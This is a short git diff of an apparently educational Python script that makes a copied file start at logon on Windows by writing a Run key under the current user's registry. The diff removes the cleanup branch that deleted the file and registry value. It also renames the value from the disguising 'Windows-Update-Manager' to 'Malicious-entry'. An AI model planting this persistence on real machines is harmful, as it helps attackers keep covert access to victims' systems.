@@ -19,18 +19,7 @@ print(f'\t[|] Destination: {destination}')
 
 if os.path.exists(destination):
     print('\n[X] System already touched, nothing to do...')
-    # remove = input('\n\t[|] Remove persistence "Yes" or "No"? ').lower()
-    # if remove == 'yes':
-    os.remove(destination)
-    print('\t[|] File deleted...')
-    with winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run",
-            0,
-            winreg.KEY_ALL_ACCESS
-    ) as key:
-        winreg.DeleteValue(key, 'Windows-Update-Manager')
-    print('\t[|] Register cleaned...')
+    exit()
 else:
     print(f'[+] Persisting file: {FILENAME}')
     shutil.copyfile(path + FILENAME, destination)
@@ -47,7 +36,7 @@ else:
     ) as key:
         winreg.SetValueEx(
             key,
-            'Windows-Update-Manager',
+            'Malicious-entry',
             0,
             winreg.REG_SZ, destination
         )
